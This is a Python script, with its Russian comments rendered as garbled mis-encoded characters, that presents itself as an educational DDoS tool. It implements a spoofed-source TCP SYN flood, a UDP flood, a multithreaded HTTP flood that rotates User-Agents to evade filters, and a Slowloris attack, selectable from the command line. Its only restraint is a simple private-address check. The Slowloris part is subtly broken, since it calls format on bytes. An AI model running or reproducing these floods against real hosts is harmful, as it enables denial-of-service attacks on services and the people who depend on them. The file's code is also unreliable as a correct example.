#!/usr/bin/env python3
"""
–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è DDoS –∞—Ç–∞–∫
–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥–µ!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
–õ–∏—Ü–µ–Ω–∑–∏—è: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
"""

import socket
import threading
import time
import random
import argparse
import sys
from urllib.parse import urlparse
import requests
from scapy.all import *

class EducationalDDoSTool:
    """
    –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ DDoS –∞—Ç–∞–∫
    """
    
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_running = False
        self.thread_count = 0
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ - —Ç–æ–ª—å–∫–æ –ª–æ–∫–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞
        if not self._is_safe_target(target_ip):
            print("‚ùå –û–®–ò–ë–ö–ê: –≠—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω—ã—Ö –∞–¥—Ä–µ—Å–æ–≤!")
            print("–†–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ –∞–¥—Ä–µ—Å–∞: 127.0.0.1, 192.168.x.x, 10.x.x.x, 172.16-31.x.x")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """
        –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —Ü–µ–ª–µ–≤–æ–π IP –±–µ–∑–æ–ø–∞—Å–Ω—ã–º –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        –†–∞–∑—Ä–µ—à–µ–Ω—ã —Ç–æ–ª—å–∫–æ –ª–æ–∫–∞–ª—å–Ω—ã–µ –∏ —á–∞—Å—Ç–Ω—ã–µ —Å–µ—Ç–∏
        """
        safe_ranges = [
            '127.',          # localhost
            '192.168.',      # —á–∞—Å—Ç–Ω–∞—è —Å–µ—Ç—å –∫–ª–∞—Å—Å–∞ C
            '10.',           # —á–∞—Å—Ç–Ω–∞—è —Å–µ—Ç—å –∫–ª–∞—Å—Å–∞ A
        ]
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–∞—Å—Ç–Ω–æ–π —Å–µ—Ç–∏ –∫–ª–∞—Å—Å–∞ B (172.16.0.0 - 172.31.255.255)
        if ip.startswith('172.'):
            third_octet = int(ip.split('.')[1])
            if 16 <= third_octet <= 31:
                return True
        
        return any(ip.startswith(prefix) for prefix in safe_ranges)
    
    def tcp_flood(self, duration=60):
        """
        TCP SYN Flood –∞—Ç–∞–∫–∞
        –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ TCP SYN –ø–∞–∫–µ—Ç–æ–≤, –Ω–µ –∑–∞–≤–µ—Ä—à–∞—è handshake
        """
        print(f"üöÄ –ó–∞–ø—É—Å–∫ TCP SYN Flood –∞—Ç–∞–∫–∏ –Ω–∞ {self.target_ip}:{self.target_port}")
        print(f"‚è±Ô∏è  –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {duration} —Å–µ–∫—É–Ω–¥")
        
        self.attack_running = True
        start_time = time.time()
        packet_count = 0
        
        while self.attack_running and (time.time() - start_time) < duration:
            try:
                # –°–æ–∑–¥–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –∏—Å—Ö–æ–¥–Ω—ã–π IP (—Å–ø—É—Ñ–∏–Ω–≥)
                src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)
                
                # –°–æ–∑–¥–∞–µ–º TCP SYN –ø–∞–∫–µ—Ç —Å –ø–æ–º–æ—â—å—é Scapy
                packet = IP(src=src_ip, dst=self.target_ip) / \
                        TCP(sport=src_port, dport=self.target_port, flags="S")
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–∞–∫–µ—Ç
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"üìä –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {packet_count} SYN –ø–∞–∫–µ—Ç–æ–≤...")
                    
            except Exception as e:
                print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–∞–∫–µ—Ç–∞: {e}")
                time.sleep(0.1)
        
        self.attack_running = False
        print(f"‚úÖ TCP SYN Flood –∑–∞–≤–µ—Ä—à–µ–Ω. –í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {packet_count} –ø–∞–∫–µ—Ç–æ–≤")
    
    def udp_flood(self, duration=60):
        """
        UDP Flood –∞—Ç–∞–∫–∞
        –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–µ UDP –ø–∞–∫–µ—Ç—ã –Ω–∞ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–æ—Ä—Ç—ã
        """
        print(f"üöÄ –ó–∞–ø—É—Å–∫ UDP Flood –∞—Ç–∞–∫–∏ –Ω–∞ {self.target_ip}")
        print(f"‚è±Ô∏è  –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {duration} —Å–µ–∫—É–Ω–¥")
        
        self.attack_running = True
        start_time = time.time()
        packet_count = 0
        
        while self.attack_running and (time.time() - start_time) < duration:
            try:
                # –°–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è UDP –ø–∞–∫–µ—Ç–∞
                payload = random._urandom(random.randint(64, 1024))
                target_port = random.randint(1, 65535)
                
                # –°–æ–∑–¥–∞–µ–º UDP –ø–∞–∫–µ—Ç
                packet = IP(dst=self.target_ip) / UDP(dport=target_port) / payload
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–∞–∫–µ—Ç
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 500 == 0:
                    print(f"üìä –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {packet_count} UDP –ø–∞–∫–µ—Ç–æ–≤...")
                    
            except Exception as e:
                print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ UDP –ø–∞–∫–µ—Ç–∞: {e}")
                time.sleep(0.1)
        
        self.attack_running = False
        print(f"‚úÖ UDP Flood –∑–∞–≤–µ—Ä—à–µ–Ω. –í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {packet_count} –ø–∞–∫–µ—Ç–æ–≤")
    
    def http_flood_worker(self, url, duration):
        """
        –†–∞–±–æ—á–∏–π –ø–æ—Ç–æ–∫ –¥–ª—è HTTP flood –∞—Ç–∞–∫–∏
        """
        start_time = time.time()
        request_count = 0
        
        # –°–ª—É—á–∞–π–Ω—ã–µ User-Agent –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø—Ä–æ—Å—Ç—ã—Ö —Ñ–∏–ª—å—Ç—Ä–æ–≤
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
        ]
        
        while self.attack_running and (time.time() - start_time) < duration:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                }
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º GET –∑–∞–ø—Ä–æ—Å
                response = requests.get(url, headers=headers, timeout=5)
                request_count += 1
                
            except requests.exceptions.RequestException:
                # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è - —ç—Ç–æ –æ–∂–∏–¥–∞–µ–º–æ –ø—Ä–∏ DDoS
                request_count += 1
                pass
            except Exception as e:
                time.sleep(0.1)
        
        print(f"üßµ –ü–æ—Ç–æ–∫ –∑–∞–≤–µ—Ä—à–µ–Ω. –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {request_count} HTTP –∑–∞–ø—Ä–æ—Å–æ–≤")
        self.thread_count -= 1
    
    def http_flood(self, url, duration=60, threads=50):
        """
        HTTP Flood –∞—Ç–∞–∫–∞
        –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ HTTP –∑–∞–ø—Ä–æ—Å–æ–≤ –¥–ª—è –ø–µ—Ä–µ–≥—Ä—É–∑–∫–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞
        """
        print(f"üöÄ –ó–∞–ø—É—Å–∫ HTTP Flood –∞—Ç–∞–∫–∏ –Ω–∞ {url}")
        print(f"‚è±Ô∏è  –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {duration} —Å–µ–∫—É–Ω–¥")
        print(f"üßµ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤: {threads}")
        
        self.attack_running = True
        self.thread_count = threads
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫–∏
        for i in range(threads):
            thread = threading.Thread(
                target=self.http_flood_worker, 
                args=(url, duration)
            )
            thread.daemon = True
            thread.start()
            time.sleep(0.01)  # –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—É—Å–∫–æ–º –ø–æ—Ç–æ–∫–æ–≤
        
        # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
        time.sleep(duration)
        self.attack_running = False
        
        # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ—Ç–æ–∫–æ–≤
        while self.thread_count > 0:
            time.sleep(1)
        
        print("‚úÖ HTTP Flood –∞—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
    
    def slowloris_attack(self, duration=300):
        """
        Slowloris –∞—Ç–∞–∫–∞
        –ú–µ–¥–ª–µ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç HTTP –∑–∞–≥–æ–ª–æ–≤–∫–∏, –¥–µ—Ä–∂–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –æ—Ç–∫—Ä—ã—Ç—ã–º–∏
        """
        print(f"üêå –ó–∞–ø—É—Å–∫ Slowloris –∞—Ç–∞–∫–∏ –Ω–∞ {self.target_ip}:{self.target_port}")
        print(f"‚è±Ô∏è  –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {duration} —Å–µ–∫—É–Ω–¥")
        
        self.attack_running = True
        sockets = []
        
        try:
            # –°–æ–∑–¥–∞–µ–º –º–Ω–æ–∂–µ—Å—Ç–≤–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
            for i in range(200):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π HTTP –∑–∞–ø—Ä–æ—Å
                    sock.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
                    sock.send(b"Host: {}\r\n".format(self.target_ip).encode())
                    sock.send(b"User-Agent: Mozilla/5.0 (Educational DDoS Tool)\r\n")
                    sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
                    
                    sockets.append(sock)
                    
                except socket.error:
                    break
            
            print(f"üì° –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ {len(sockets)} —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π")
            
            start_time = time.time()
            while self.attack_running and (time.time() - start_time) < duration:
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
                for sock in sockets[:]:
                    try:
                        sock.send(b"X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    except socket.error:
                        sockets.remove(sock)
                
                # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –≤–∑–∞–º–µ–Ω –∑–∞–∫—Ä—ã—Ç—ã—Ö
                for i in range(len(sockets), 200):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((self.target_ip, self.target_port))
                        sock.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
                        sockets.append(sock)
                    except socket.error:
                        break
                
                print(f"üîÑ –ê–∫—Ç–∏–≤–Ω—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π: {len(sockets)}")
                time.sleep(15)
        
        finally:
            # –ó–∞–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            self.attack_running = False
            print("‚úÖ Slowloris –∞—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω–æ–≥–æ DDoS –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    """
    print("=" * 60)
    print("üéì –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–´–ô DDoS –ò–ù–°–¢–†–£–ú–ï–ù–¢")
    print("=" * 60)
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏!")
    print("‚ö†Ô∏è  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ç–∏–≤ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º –ù–ï–ó–ê–ö–û–ù–ù–û!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π DDoS –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç')
    parser.add_argument('target', help='IP –∞–¥—Ä–µ—Å —Ü–µ–ª–∏ (—Ç–æ–ª—å–∫–æ –ª–æ–∫–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏)')
    parser.add_argument('-p', '--port', type=int, default=80, help='–ü–æ—Ä—Ç —Ü–µ–ª–∏ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 80)')
    parser.add_argument('-t', '--type', choices=['tcp', 'udp', 'http', 'slowloris'], 
                       default='http', help='–¢–∏–ø –∞—Ç–∞–∫–∏')
    parser.add_argument('-d', '--duration', type=int, default=60, 
                       help='–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∞—Ç–∞–∫–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
    parser.add_argument('--threads', type=int, default=50, 
                       help='–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤ –¥–ª—è HTTP –∞—Ç–∞–∫–∏')
    parser.add_argument('--url', help='URL –¥–ª—è HTTP –∞—Ç–∞–∫–∏ (–µ—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è http://target:port/)')
    
    args = parser.parse_args()
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    ddos_tool = EducationalDDoSTool(args.target, args.port)
    
    try:
        if args.type == 'tcp':
            ddos_tool.tcp_flood(args.duration)
        elif args.type == 'udp':
            ddos_tool.udp_flood(args.duration)
        elif args.type == 'http':
            url = args.url or f"http://{args.target}:{args.port}/"
            ddos_tool.http_flood(url, args.duration, args.threads)
        elif args.type == 'slowloris':
            ddos_tool.slowloris_attack(args.duration)
            
    except KeyboardInterrupt:
        print("\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        ddos_tool.attack_running = False
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    
    print("\nüìö –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:")
    print("‚Ä¢ TCP SYN Flood - –∏—Å—á–µ—Ä–ø—ã–≤–∞–µ—Ç —Ç–∞–±–ª–∏—Ü—É —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π")
    print("‚Ä¢ UDP Flood - –ø–µ—Ä–µ–≥—Ä—É–∂–∞–µ—Ç —Å–µ—Ç—å —Å–ª—É—á–∞–π–Ω—ã–º —Ç—Ä–∞—Ñ–∏–∫–æ–º") 
    print("‚Ä¢ HTTP Flood - –ø–µ—Ä–µ–≥—Ä—É–∂–∞–µ—Ç –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –∑–∞–ø—Ä–æ—Å–∞–º–∏")
    print("‚Ä¢ Slowloris - –∏—Å—á–µ—Ä–ø—ã–≤–∞–µ—Ç –ø—É–ª —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –º–µ–¥–ª–µ–Ω–Ω—ã–º–∏ –∑–∞–ø—Ä–æ—Å–∞–º–∏")
    print("\nüõ°Ô∏è  –ú–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã:")
    print("‚Ä¢ Rate limiting –∏ DDoS protection")
    print("‚Ä¢ Firewall –ø—Ä–∞–≤–∏–ª–∞ –∏ –≥–µ–æ–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞")
    print("‚Ä¢ Load balancing –∏ CDN")
    print("‚Ä¢ –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Ç—Ä–∞—Ñ–∏–∫–∞ –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∏–µ")

if __name__ == "__main__":
    main()
